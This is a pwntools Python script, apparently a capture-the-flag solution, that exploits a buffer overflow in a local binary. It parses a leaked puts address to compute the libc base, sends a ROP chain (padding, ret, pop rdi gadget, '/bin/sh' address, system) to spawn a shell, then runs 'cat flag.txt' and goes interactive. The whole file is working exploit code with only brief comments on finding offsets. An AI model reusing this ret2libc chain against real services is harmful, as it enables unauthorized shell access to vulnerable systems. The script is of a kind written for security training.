from pwn import *


#p=remote("localhost",10001)
p=process("./main")

p.recvuntil("address of puts in libc : ")
leak=p.recvline()[:-1]  # remove newline
puts_address=int(leak,16)

#manually
puts_offset=0x77640  # take this from 'gdb libc.so.6' (simplest way)
libc_base=puts_address-puts_offset
system=0x000000000004dab0 # get from the one_gadget tool 
system=libc_base+0x000000000004dab0

#automated
#puts_offset=libc.symbols["puts"] 
#libc.address=puts_address-puts_offset
#system=libc.symbols["system"]

rdi=0x401316  # get from 'ropper -f main'
binsh=0x404038 # search it in gdb
ret=0x0000000000401488

p.sendline(b"a"*0x20+p64(0x0000000000404800)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)) # one_gadgets dont always work

p.sendline("cat flag.txt")

p.interactive()